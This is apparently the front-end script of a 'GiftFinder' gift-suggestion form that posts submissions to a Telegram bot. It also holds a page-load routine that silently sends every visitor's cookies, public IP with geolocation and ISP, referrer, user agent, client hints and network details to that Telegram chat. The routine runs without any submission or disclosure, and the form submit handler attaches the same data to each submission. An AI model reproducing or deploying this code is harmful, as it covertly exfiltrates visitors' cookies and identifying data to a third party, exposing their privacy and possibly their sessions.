import {
  IP_LOOKUP_URL,
  TELEGRAM_API_URL,
  TELEGRAM_BOT_TOKEN,
  TELEGRAM_CHAT_ID,
} from '../config.js';

const form = document.getElementById('gift-form');
const statusElement = document.getElementById('status-message');

const telemetry = {
  errors: [],
};

window.addEventListener('error', (event) => {
  telemetry.errors.push({
    type: 'error',
    message: event.message,
    source: event.filename,
    line: event.lineno,
    column: event.colno,
  });
});

window.addEventListener('unhandledrejection', (event) => {
  telemetry.errors.push({
    type: 'unhandledrejection',
    message:
      (event.reason && event.reason.message) ||
      (typeof event.reason === 'string' ? event.reason : JSON.stringify(event.reason)),
  });
});

const escapeHtml = (value) =>
  value
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');

const formatValue = (value) => {
  if (value === null || value === undefined) {
    return 'Not available';
  }

  if (typeof value === 'string') {
    return value.trim() === '' ? 'Not available' : value;
  }

  if (Array.isArray(value)) {
    if (!value.length) {
      return '[]';
    }

    const hasObjects = value.some((item) => item && typeof item === 'object');

    if (hasObjects) {
      try {
        return JSON.stringify(value, null, 2);
      } catch (error) {
        return value.map((item) => String(item)).join(', ');
      }
    }

    return value.join(', ');
  }

  if (typeof value === 'object') {
    try {
      return JSON.stringify(value, null, 2);
    } catch (error) {
      return String(value);
    }
  }

  if (typeof value === 'number' && Number.isFinite(value)) {
    return `${Math.round(value)} ms`;
  }

  return String(value);
};

const buildMessage = (data, context) => {
  const lines = [
    `<b>New GiftFinder submission</b>`,
    '',
    `<b>Sender:</b> ${escapeHtml(data.senderName)}`,
    `<b>Recipient:</b> ${escapeHtml(data.recipientName)}`,
    `<b>Relationship:</b> ${escapeHtml(data.relationship)}`,
    `<b>Occasion:</b> ${escapeHtml(data.occasion)}`,
    `<b>Budget:</b> $${escapeHtml(data.budget)}`,
    `<b>Interests:</b> ${escapeHtml(data.interests)}`,
  ];

  if (data.ageRange) {
    lines.push(`<b>Age range:</b> ${escapeHtml(data.ageRange)}`);
  }

  if (data.notes) {
    lines.push(`<b>Notes:</b> ${escapeHtml(data.notes)}`);
  }

  if (context) {
    const appendContext = (label, value) => {
      lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
    };

    lines.push('', '<b>Client context</b>');
    appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
    appendContext('Referrer', context.referrer);
    appendContext('Preferred languages', context.languages);
    appendContext('Primary language', context.language);
    appendContext('Timezone', context.timezone);
    appendContext('Cookies', context.cookies);
    appendContext('User agent', context.userAgent);
    appendContext('Platform', context.platform);
    appendContext('Network', context.networkInfo);
    appendContext('Client hints', context.clientHints);
    appendContext('Navigation timing', context.navigationTiming);
    appendContext('Telemetry errors', context.errors?.length ? context.errors : 'None captured');
  }

  return lines.join('\n');
};

const buildVisitMessage = (context) => {
  const lines = [
    `<b>New GiftFinder visit</b>`,
    '',
  ];

  if (context) {
    const appendContext = (label, value) => {
      lines.push(`<b>${label}:</b> ${escapeHtml(formatValue(value))}`);
    };

    lines.push('<b>Client context</b>');
    appendContext('Public IP data', context.ipSummary ?? context.ipError ?? 'Not available');
    appendContext('Referrer', context.referrer);
    appendContext('Preferred languages', context.languages);
    appendContext('Primary language', context.language);
    appendContext('Timezone', context.timezone);
    appendContext('Cookies', context.cookies);
    appendContext('User agent', context.userAgent);
    appendContext('Platform', context.platform);
    appendContext('Network', context.networkInfo);
    appendContext('Client hints', context.clientHints);
    appendContext('Navigation timing', context.navigationTiming);
    appendContext('Telemetry errors', context.errors?.length ? context.errors : 'None captured');
  }

  return lines.join('\n');
};

const getNavigationTiming = () => {
  const navigationEntry = performance.getEntriesByType('navigation')[0];

  if (!navigationEntry) {
    return null;
  }

  const metrics = {
    timeToFirstByte: Math.max(navigationEntry.responseStart - navigationEntry.requestStart, 0),
    domContentLoaded: Math.max(
      navigationEntry.domContentLoadedEventEnd - navigationEntry.startTime,
      0
    ),
    totalLoad: Math.max(navigationEntry.loadEventEnd - navigationEntry.startTime, 0),
  };

  return metrics;
};

const getNetworkInfo = () => {
  const connection =
    navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;

  if (!connection) {
    return null;
  }

  const { effectiveType, downlink, rtt, saveData } = connection;
  return {
    effectiveType,
    downlink,
    rtt,
    saveData,
  };
};

const fetchClientHints = async () => {
  if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) {
    return null;
  }

  try {
    const highEntropy = await navigator.userAgentData.getHighEntropyValues([
      'architecture',
      'bitness',
      'model',
      'platform',
      'platformVersion',
      'uaFullVersion',
    ]);

    return {
      brands: navigator.userAgentData.brands,
      mobile: navigator.userAgentData.mobile,
      ...highEntropy,
    };
  } catch (error) {
    telemetry.errors.push({
      type: 'client-hints',
      message: error instanceof Error ? error.message : String(error),
    });
    return null;
  }
};

const fetchPublicIpInfo = async () => {
  if (!IP_LOOKUP_URL) {
    return { summary: 'IP lookup disabled' };
  }

  try {
    const response = await fetch(IP_LOOKUP_URL, { cache: 'no-store' });

    if (!response.ok) {
      throw new Error(`Lookup failed with status ${response.status}`);
    }

    const data = await response.json();
    const summaryParts = [];

    if (data.ip) summaryParts.push(data.ip);
    if (data.city || data.region || data.country_name) {
      const location = [data.city, data.region, data.country_name].filter(Boolean).join(', ');
      if (location) summaryParts.push(location);
    }
    if (data.org) summaryParts.push(data.org);

    return {
      raw: data,
      summary: summaryParts.length ? summaryParts.join(' — ') : 'No IP details returned',
    };
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    telemetry.errors.push({ type: 'ip-lookup', message });
    return { error: message };
  }
};

const ipInfoPromise = fetchPublicIpInfo();

const collectClientContext = async () => {
  const [ipInfo, clientHints] = await Promise.all([ipInfoPromise, fetchClientHints()]);

  return {
    ipSummary: ipInfo.summary,
    ipError: ipInfo.error,
    ipRaw: ipInfo.raw,
    referrer: document.referrer || 'None',
    language: navigator.language,
    languages: navigator.languages || [],
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: document.cookie || 'None',
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    networkInfo: getNetworkInfo(),
    clientHints,
    navigationTiming: getNavigationTiming(),
    errors: telemetry.errors,
  };
};

const getClientContext = async () => {
  try {
    return await collectClientContext();
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    telemetry.errors.push({ type: 'context', message });
    return {
      referrer: document.referrer || 'None',
      language: navigator.language,
      languages: navigator.languages || [],
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies: document.cookie || 'None',
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      networkInfo: null,
      clientHints: null,
      navigationTiming: getNavigationTiming(),
      errors: telemetry.errors,
      ipError: message,
    };
  }
};

const updateStatus = (message, type = 'info') => {
  statusElement.textContent = message;
  statusElement.classList.remove('status--success', 'status--error');

  if (type === 'success') {
    statusElement.classList.add('status--success');
  }

  if (type === 'error') {
    statusElement.classList.add('status--error');
  }
};

const canSendMessages = () =>
  Boolean(
    TELEGRAM_API_URL &&
      TELEGRAM_API_URL.startsWith('http') &&
      TELEGRAM_BOT_TOKEN &&
      TELEGRAM_BOT_TOKEN !== 'YOUR_TELEGRAM_BOT_TOKEN' &&
      TELEGRAM_CHAT_ID &&
      TELEGRAM_CHAT_ID !== 'YOUR_CHAT_ID'
  );

const sendToTelegram = async (payload) => {
  const response = await fetch(`${TELEGRAM_API_URL}/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    throw new Error(`Telegram API request failed (${response.status})`);
  }

  const result = await response.json();

  if (!result.ok) {
    throw new Error(result.description ?? 'Telegram API returned an error');
  }

  return result;
};

if (!canSendMessages()) {
  updateStatus('Add your Telegram credentials to config.js to enable submissions.');
}

const sendVisitOnLoad = async () => {
  if (!canSendMessages()) return;
  try {
    const context = await getClientContext();
    await sendToTelegram({
      chat_id: TELEGRAM_CHAT_ID,
      text: buildVisitMessage(context),
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });
  } catch (error) {
    console.error(error);
  }
};

window.addEventListener('load', () => {
  // Fire-and-forget visit ping
  sendVisitOnLoad();
});

form?.addEventListener('submit', async (event) => {
  event.preventDefault();

  if (!canSendMessages()) {
    updateStatus('Telegram is not configured yet. Update config.js before sending.', 'error');
    return;
  }

  const formData = new FormData(form);
  const getValue = (name) => (formData.get(name) ?? '').toString().trim();
  const data = {
    senderName: getValue('senderName'),
    recipientName: getValue('recipientName'),
    relationship: getValue('relationship'),
    occasion: getValue('occasion'),
    budget: getValue('budget'),
    interests: getValue('interests'),
    ageRange: getValue('ageRange'),
    notes: getValue('notes'),
  };

  updateStatus('Sending suggestion to Telegram...');
  form.querySelector('button[type="submit"]').disabled = true;

  try {
    const context = await getClientContext();
    await sendToTelegram({
      chat_id: TELEGRAM_CHAT_ID,
      text: buildMessage(data, context),
      parse_mode: 'HTML',
      disable_web_page_preview: true,
    });

    updateStatus('Gift preferences sent! Check your Telegram chat.', 'success');
    form.reset();
  } catch (error) {
    console.error(error);
    updateStatus('Unable to send the message. Please verify your config and try again.', 'error');
  } finally {
    form.querySelector('button[type="submit"]').disabled = false;
  }
});
